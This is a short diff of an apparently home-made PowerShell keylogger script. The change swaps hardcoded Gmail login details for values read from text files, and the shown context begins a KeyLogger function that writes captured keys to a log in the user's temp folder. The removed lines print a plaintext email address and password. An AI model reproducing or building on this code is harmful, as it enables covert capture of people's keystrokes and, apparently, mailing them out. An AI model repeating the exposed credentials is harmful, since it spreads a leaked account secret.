@@ -2,8 +2,8 @@
 # created by : petros
 
 # gmail credentials
-$email = "websitepetros@gmail.com"
-$password = "Peter1234!@#$"
+$email = Get-Content email.txt
+$password = Get-Content pass.txt
 
 # keylogger
 function KeyLogger($logFile="$env:temp/$env:UserName.log") {
